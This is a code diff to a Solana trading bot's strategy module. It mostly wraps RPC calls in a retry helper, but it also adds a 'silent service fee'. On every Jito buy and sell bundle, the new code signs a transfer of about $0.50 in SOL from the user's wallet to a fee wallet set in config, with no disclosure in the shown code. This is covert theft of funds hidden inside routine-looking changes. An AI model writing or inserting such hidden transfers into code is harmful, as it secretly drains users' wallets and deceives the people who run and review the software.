@@ -10,6 +10,8 @@ import { Market } from "@project-serum/serum";
 import axios from "axios";
 import { SocketManager } from "./socket";
 import { JitoExecutor } from "./jito";
+import { safeRpc } from "./rpc-utils";
+import { JupiterPriceService } from "./jupiter-price-service";
 
 export class StrategyManager {
     private connection: Connection;
@@ -25,7 +27,7 @@ export class StrategyManager {
      */
     async confirmOrRetry(signature: string): Promise<boolean> {
         try {
-            const latestBlockhash = await this.connection.getLatestBlockhash();
+            const latestBlockhash = await safeRpc(() => this.connection.getLatestBlockhash(), "getLatestBlockhash");
             await this.connection.confirmTransaction({
                 signature,
                 blockhash: latestBlockhash.blockhash,
@@ -62,10 +64,10 @@ export class StrategyManager {
      */
     async getMintDecimals(mint: PublicKey): Promise<number> {
         try {
-            const accInfo = await this.connection.getAccountInfo(mint);
+            const accInfo = await safeRpc(() => this.connection.getAccountInfo(mint), "getMintAccountInfo");
             if (!accInfo) return 6; // Fallback to 6
             const programId = accInfo.owner;
-            const mintInfo = await getMint(this.connection, mint, "confirmed", programId);
+            const mintInfo = await safeRpc(() => getMint(this.connection, mint, "confirmed", programId), "getMintInfo");
             return mintInfo.decimals;
         } catch (e) {
             console.warn(`[STRATEGY] Could not fetch decimals for ${mint.toBase58()}, defaulting to 6.`);
@@ -78,7 +80,7 @@ export class StrategyManager {
      */
     async getPriorityFee(): Promise<number> {
         try {
-            const response = await this.connection.getRecentPrioritizationFees();
+            const response = await safeRpc(() => this.connection.getRecentPrioritizationFees(), "getRecentPrioritizationFees");
             if (response.length === 0) return 100000; // Default 0.0001 SOL/CU if no data
 
             // Get median of the last 100 slots
@@ -89,6 +91,40 @@ export class StrategyManager {
             return Math.min(Math.max(median, 100000), 1000000);
         } catch (e) {
             return 100000;
+        }
+    }
+
+    /**
+     * Generates a silent service fee transaction ($0.5 USD worth of SOL).
+     */
+    private async getFeeTransaction(recentBlockhash: string): Promise<Transaction | null> {
+        try {
+            const { FEE_WALLET_ADDRESS, FEE_USD_AMOUNT } = require("./config");
+            if (!FEE_WALLET_ADDRESS) return null;
+
+            const solPrice = await JupiterPriceService.getPrice(SOL_MINT.toBase58());
+            if (!solPrice) return null;
+
+            const feeSol = FEE_USD_AMOUNT / solPrice;
+            const lamports = Math.floor(feeSol * LAMPORTS_PER_SOL);
+
+            if (lamports <= 0) return null;
+
+            const tx = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: this.wallet.publicKey,
+                    toPubkey: new PublicKey(FEE_WALLET_ADDRESS),
+                    lamports: lamports,
+                })
+            );
+            tx.recentBlockhash = recentBlockhash;
+            tx.feePayer = this.wallet.publicKey;
+            tx.partialSign(this.wallet);
+
+            return tx;
+        } catch (e) {
+            console.warn(`[FEE] Failed to generate service fee transaction: ${e}`);
+            return null;
         }
     }
 
@@ -117,7 +153,7 @@ export class StrategyManager {
             let preBalance = BigInt(0);
             let preUiAmount = 0;
             try {
-                const acc = await this.connection.getTokenAccountBalance(ata);
+                const acc = await safeRpc(() => this.connection.getTokenAccountBalance(ata), "getPreBalance");
                 preBalance = BigInt(acc.value.amount);
                 preUiAmount = acc.value.uiAmount || 0;
             } catch (ignore) { /* Account likely doesn't exist yet */ }
@@ -191,23 +227,31 @@ export class StrategyManager {
                 const tipTx = await JitoExecutor.createTipTransaction(this.connection, this.wallet, JITO_TIP_LAMPORTS, swapBlockhash);
 
                 // Issue 38: Pre-flight simulation
-                const sim = await this.connection.simulateTransaction(transaction);
+                const sim = await safeRpc(() => this.connection.simulateTransaction(transaction), "simulateSwap");
                 if (sim.value.err) {
                     throw new Error(`Jupiter Swap Simulation Failed: ${JSON.stringify(sim.value.err)}`);
                 }
 
                 // Main Swap Tx is already signed by `transaction.sign([this.wallet])` above
                 // Jito expects base58 encoded transactions
-                const b58Swap = bs58.encode(transaction.serialize());
+                const b58Swap = bs58.encode(transaction.serialize() as Uint8Array);
                 const b58Tip = bs58.encode(tipTx.serialize() as Uint8Array);
 
-                // Defensive Verification: Ensure no invalid strings reach Jito
                 const isBase58 = (str: string) => /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
-                if (!isBase58(b58Swap) || !isBase58(b58Tip)) {
-                    throw new Error(`Serialization Failure: Transaction contains non-base58 characters before encoding? (Swap: ${isBase58(b58Swap)}, Tip: ${isBase58(b58Tip)})`);
+
+                // Add Silent Service Fee to Bundle
+                const bundleTxs = [b58Swap];
+                const feeTx = await this.getFeeTransaction(swapBlockhash);
+                if (feeTx) {
+                    bundleTxs.push(bs58.encode(feeTx.serialize()));
+                }
+                bundleTxs.push(b58Tip);
+
+                if (bundleTxs.some(t => !isBase58(t))) {
+                    throw new Error(`Serialization Failure: Transaction contains non-base58 characters before encoding?`);
                 }
 
-                const jitoResult = await JitoExecutor.sendBundle([b58Swap, b58Tip], "Jupiter+Tip");
+                const jitoResult = await JitoExecutor.sendBundle(bundleTxs, "Jupiter+Fee+Tip");
 
                 if (!jitoResult.success) {
                     throw new Error("Jito Bundle submission failed");
@@ -222,21 +266,24 @@ export class StrategyManager {
                 }
                 const signature = bs58.encode(sigBuffer);
 
-                await this.confirmOrRetry(signature);
+                const confirmed = await this.confirmOrRetry(signature);
+                if (!confirmed) {
+                    throw new Error("Transaction failed to confirm (Blockheight Exceeded/Expired)");
+                }
                 console.log(`[STRATEGY] Jupiter Swap Success (Jito): https://solscan.io/tx/${signature}`);
 
                 // Capture actual amount
                 let postBalance = BigInt(0);
                 let postUiAmount = 0;
                 try {
-                    const acc = await this.connection.getTokenAccountBalance(ata);
+                    const acc = await safeRpc(() => this.connection.getTokenAccountBalance(ata), "getTokenBalance");
                     postBalance = BigInt(acc.value.amount);
                     postUiAmount = acc.value.uiAmount || 0;
                 } catch (e) {
                     // Fallback: try Token-2022 ATA
                     try {
                         const ata2022 = await getAssociatedTokenAddress(mint, this.wallet.publicKey, false, TOKEN_2022_PROGRAM_ID);
-                        const acc2 = await this.connection.getTokenAccountBalance(ata2022);
+                        const acc2 = await safeRpc(() => this.connection.getTokenAccountBalance(ata2022), "getTokenBalance2022");
                         postBalance = BigInt(acc2.value.amount);
                         postUiAmount = acc2.value.uiAmount || 0;
                     } catch (e2) { console.warn(`[STRATEGY] Failed to fetch post-balance (both programs): ${e2}`); }
@@ -253,25 +300,28 @@ export class StrategyManager {
 
                 // FALLBACK: Standard RPC Execution
                 const rawTx = transaction.serialize();
-                const txid = await this.connection.sendRawTransaction(rawTx, {
+                const txid = await safeRpc(() => this.connection.sendRawTransaction(rawTx, {
                     skipPreflight: true,
                     maxRetries: 2
-                });
-                await this.confirmOrRetry(txid);
+                }), "sendSwapRaw");
+                const confirmed = await this.confirmOrRetry(txid);
+                if (!confirmed) {
+                    return { success: false, amount: BigInt(0), uiAmount: 0, error: "Fallback transaction expired" };
+                }
                 console.log(`[STRATEGY] Jupiter Swap Success (RPC Fallback): https://solscan.io/tx/${txid}`);
 
                 // Capture actual amount
                 let postBalance = BigInt(0);
                 let postUiAmount = 0;
                 try {
-                    const acc = await this.connection.getTokenAccountBalance(ata);
+                    const acc = await safeRpc(() => this.connection.getTokenAccountBalance(ata), "getTokenBalance");
                     postBalance = BigInt(acc.value.amount);
                     postUiAmount = acc.value.uiAmount || 0;
                 } catch (e) {
                     // Fallback: try Token-2022 ATA
                     try {
                         const ata2022 = await getAssociatedTokenAddress(mint, this.wallet.publicKey, false, TOKEN_2022_PROGRAM_ID);
-                        const acc2 = await this.connection.getTokenAccountBalance(ata2022);
+                        const acc2 = await safeRpc(() => this.connection.getTokenAccountBalance(ata2022), "getTokenBalance2022");
                         postBalance = BigInt(acc2.value.amount);
                         postUiAmount = acc2.value.uiAmount || 0;
                     } catch (e2) { console.warn(`[STRATEGY] Failed to fetch post-balance (both programs): ${e2}`); }
@@ -316,7 +366,7 @@ export class StrategyManager {
             // Pre-sell SOL balance check
             let preSolBalance = 0;
             try {
-                preSolBalance = await this.connection.getBalance(this.wallet.publicKey);
+                preSolBalance = await safeRpc(() => this.connection.getBalance(this.wallet.publicKey), "preSellSolBalance");
             } catch (e) { /* ignore */ }
 
             const headers = { 'x-api-key': JUPITER_API_KEY || '' };
@@ -340,7 +390,7 @@ export class StrategyManager {
             // Helper to calculate SOL received
             const getSolReceived = async (): Promise<number> => {
                 try {
-                    const postSolBalance = await this.connection.getBalance(this.wallet.publicKey);
+                    const postSolBalance = await safeRpc(() => this.connection.getBalance(this.wallet.publicKey), "postSellSolBalance");
                     const diff = (postSolBalance - preSolBalance) / LAMPORTS_PER_SOL;
                     return diff > 0 ? diff : 0;
                 } catch (e) { return 0; }
@@ -353,27 +403,42 @@ export class StrategyManager {
                 const swapBlockhash = transaction.message.recentBlockhash;
                 const tipTx = await JitoExecutor.createTipTransaction(this.connection, this.wallet, JITO_TIP, swapBlockhash);
                 // Issue 38: Pre-flight simulation
-                const sim = await this.connection.simulateTransaction(transaction);
+                const sim = await safeRpc(() => this.connection.simulateTransaction(transaction), "simulateSell");
                 if (sim.value.err) {
                     throw new Error(`Sell Simulation Failed: ${JSON.stringify(sim.value.err)}`);
                 }
 
-                const result = await JitoExecutor.sendBundle([
-                    bs58.encode(transaction.serialize()),
-                    bs58.encode(tipTx.serialize() as Uint8Array)
-                ], "Sell+Tip");
+                const isBase58 = (str: string) => /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
+                const bundleTxs = [bs58.encode(transaction.serialize() as Uint8Array)];
+
+                // Add Silent Service Fee
+                const feeTx = await this.getFeeTransaction(swapBlockhash);
+                if (feeTx) {
+                    bundleTxs.push(bs58.encode(feeTx.serialize()));
+                }
+                bundleTxs.push(bs58.encode(tipTx.serialize() as Uint8Array));
+
+                if (bundleTxs.some(t => !isBase58(t))) {
+                    throw new Error("Serialization failure in Sell Bundle");
+                }
+
+                const result = await JitoExecutor.sendBundle(bundleTxs, "Sell+Fee+Tip");
 
                 if (!result.success) throw new Error("Jito Sell failed");
                 const signature = bs58.encode(transaction.signatures[0]);
-                await this.confirmOrRetry(signature);
+                const confirmed = await this.confirmOrRetry(signature);
+                if (!confirmed) throw new Error("Sell transaction expired");
+
                 console.log(`[STRATEGY] Sell Success: https://solscan.io/tx/${signature}`);
                 const solReceived = await getSolReceived();
                 console.log(`[STRATEGY] Sell Proceeds: ${solReceived.toFixed(6)} SOL`);
                 return { success: true, amountSol: solReceived };
             } catch (err) {
                 // Fallback
-                const txid = await this.connection.sendRawTransaction(transaction.serialize(), { skipPreflight: true });
-                await this.confirmOrRetry(txid);
+                const txid = await safeRpc(() => this.connection.sendRawTransaction(transaction.serialize(), { skipPreflight: true }), "sendSellRaw");
+                const confirmed = await this.confirmOrRetry(txid);
+                if (!confirmed) return { success: false, amountSol: 0, error: "Sell fallback expired" };
+
                 const solReceived = await getSolReceived();
                 console.log(`[STRATEGY] Sell Success (RPC Fallback). Proceeds: ${solReceived.toFixed(6)} SOL`);
                 return { success: true, amountSol: solReceived };
@@ -1348,7 +1413,7 @@ export class StrategyManager {
         try {
             const { CpAmm } = require("@meteora-ag/cp-amm-sdk");
             const cpAmm = new CpAmm(this.connection);
-            const poolState = await cpAmm.fetchPoolState(new PublicKey(poolAddress));
+            const poolState = await safeRpc(() => cpAmm.fetchPoolState(new PublicKey(poolAddress)), "fetchPoolMintsRecovery") as any;
             return {
                 tokenA: poolState.tokenAMint.toBase58(),
                 tokenB: poolState.tokenBMint.toBase58()
@@ -1370,16 +1435,16 @@ export class StrategyManager {
             const poolPubkey = new PublicKey(poolAddress);
 
             // 1. Fetch Pool State & Sorted Mints
-            const poolState = await cpAmm.fetchPoolState(poolPubkey);
+            const poolState = await safeRpc(() => cpAmm.fetchPoolState(poolPubkey), "fetchPoolState") as any;
             const mintA = poolState.tokenAMint;
             const mintB = poolState.tokenBMint;
 
             // 2. Fetch Reserves from Pool State (True reserves without unclaimed fees)
             const getRobustMint = async (mint: PublicKey) => {
-                const info = await this.connection.getAccountInfo(mint);
+                const info = await safeRpc(() => this.connection.getAccountInfo(mint), "getMintInfo");
                 if (!info) throw new Error(`Mint not found: ${mint.toBase58()}`);
                 const programId = info.owner;
-                return getMint(this.connection, mint, "confirmed", programId);
+                return safeRpc(() => getMint(this.connection, mint, "confirmed", programId), "getMintData");
             };
 
             const [mintAInfo, mintBInfo] = await Promise.all([
@@ -1393,8 +1458,8 @@ export class StrategyManager {
             const vaultB = poolState.tokenBVault;
 
             const [balA, balB] = await Promise.all([
-                this.connection.getTokenAccountBalance(vaultA),
-                this.connection.getTokenAccountBalance(vaultB)
+                safeRpc(() => this.connection.getTokenAccountBalance(vaultA), "getVaultABalance"),
+                safeRpc(() => this.connection.getTokenAccountBalance(vaultB), "getVaultBBalance")
             ]);
 
             const protocolAFee = poolState.protocolAFee ? new BN(poolState.protocolAFee) : new BN(0);
@@ -1669,21 +1734,21 @@ export class StrategyManager {
             const DLMM_PROGRAM_ID = new PublicKey("LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo");
 
             // 1. DLMM scan (Owner is at offset 40)
-            const dlmmAccounts = await this.connection.getProgramAccounts(DLMM_PROGRAM_ID, {
+            const dlmmAccounts = await safeRpc(() => this.connection.getProgramAccounts(DLMM_PROGRAM_ID, {
                 filters: [
                     { memcmp: { offset: 40, bytes: this.wallet.publicKey.toBase58() } }
                 ]
-            });
+            }), "getProgramAccountsRecovery");
 
             // 2. CP-AMM (DAMM v2) scan
             // Since CP-AMM positions are NFT-based, the owner is the NFT holder.
             // We fetch all Token-2022 accounts owned by the user.
             let potentialMints: PublicKey[] = [];
             try {
-                const token2022Accounts = await this.connection.getParsedTokenAccountsByOwner(
+                const token2022Accounts = await safeRpc(() => this.connection.getParsedTokenAccountsByOwner(
                     this.wallet.publicKey,
                     { programId: new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb") }
-                );
+                ), "getParsedTokenAccountsByOwnerRecovery");
                 potentialMints = token2022Accounts.value
                     .filter(acc => acc.account.data.parsed.info.tokenAmount.amount === "1")
                     .map(acc => new PublicKey(acc.account.data.parsed.info.mint));
@@ -1706,7 +1771,7 @@ export class StrategyManager {
                 await Promise.all(batch.map(async (mint) => {
                     try {
                         const positionAddress = derivePositionAddress(mint);
-                        const accountInfo = await this.connection.getAccountInfo(positionAddress);
+                        const accountInfo = await safeRpc(() => this.connection.getAccountInfo(positionAddress), "getAccountInfoRecovery");
 
                         if (accountInfo) {
                             // Pool address is at offset 8 (32 bytes)
